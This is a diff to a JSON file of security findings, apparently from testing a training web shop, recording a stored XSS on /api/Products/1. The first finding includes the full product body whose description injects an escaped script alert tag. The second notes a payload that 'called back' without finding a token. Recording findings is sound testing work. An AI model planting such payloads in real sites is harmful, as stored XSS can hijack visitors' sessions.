@@ -1,3 +1,30 @@
 {
-  "XSS" : [ "vulnerable", "no token" ]
+  "1": {
+    "Vulnerability Type": {
+      "value": "XSS (alert)"
+    },
+    "Endpoint": {
+      "value": "/api/Products/1"
+    },
+    "Payload": {
+      "value": "{\"image\":\"apple_juice.jpg\",\"createdAt\":\"2016-11-23 11:02:05.000 +00:00\",\"deletedAt\":null,\"price\":1.99,\"name\":\"Apple Juice (1000ml)\",\"description\":\"Stored XSS (Alert Box) : \u003cscript\u003ealert(\\\"YoU G0t Pwn3d!\\\")\u003c/script\u003e\",\"id\":1,\"updatedAt\":\"2016-11-23 11:02:05.000 +00:00\"}"
+    },
+    "Comment": {
+      "value": "-"
+    }
+  },
+  "2": {
+    "Vulnerability Type": {
+      "value": "XSS"
+    },
+    "Endpoint": {
+      "value": "unknown"
+    },
+    "Payload": {
+      "value": "unknown"
+    },
+    "Comment": {
+      "value": "Payload called back: no token found"
+    }
+  }
 }
